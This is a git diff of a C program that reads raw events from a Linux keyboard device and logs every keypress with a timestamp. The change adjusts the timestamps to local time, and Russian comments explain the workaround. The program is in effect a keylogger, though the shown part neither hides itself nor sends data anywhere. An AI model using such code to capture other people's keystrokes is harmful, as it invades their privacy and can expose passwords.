@@ -21,7 +21,9 @@ int main(){
     
     FILE *log = fopen(logFile, "a");
     int device = open(keyboard, O_RDONLY);
+
     struct input_event ev;
+    time_t gmt_ts;
     
     signal(SIGINT, INThandler);
 
@@ -41,8 +43,14 @@ int main(){
 
         read(device, &ev, sizeof(ev));
 
-        if(ev.type == 1 && ev.value == 1){ // принимаем только keypress 
-            fprintf(log, "%d,%s\n", ev.time.tv_sec, newKeys[ev.code]);
+        if(ev.type == 1 && ev.value == 1){ // принимаем только keypress эвенты
+            gmt_ts = mktime(gmtime(&ev.time.tv_sec)); 
+            // по какой-то странной причине localtime возвращает время по GMT, 
+            // а gmtime возвращает время GMT, из которого вычтено местное смещение (т.е если я в GMT+3, мне вернет GMT-3)
+            // поэтому приходится прибегать к хаку для получения местного времени
+            // разница между GMT (epoch time) и фейк-GMT (после gmtime) - это как раз то смещение, которое нужно 
+            // добавить к GMT для получения местного времени
+            fprintf(log, "%d,%s\n", (ev.time.tv_sec+(ev.time.tv_sec - gmt_ts)), newKeys[ev.code]);
             fflush(log); // сразу же записываем нажатие в лог
         }
     }
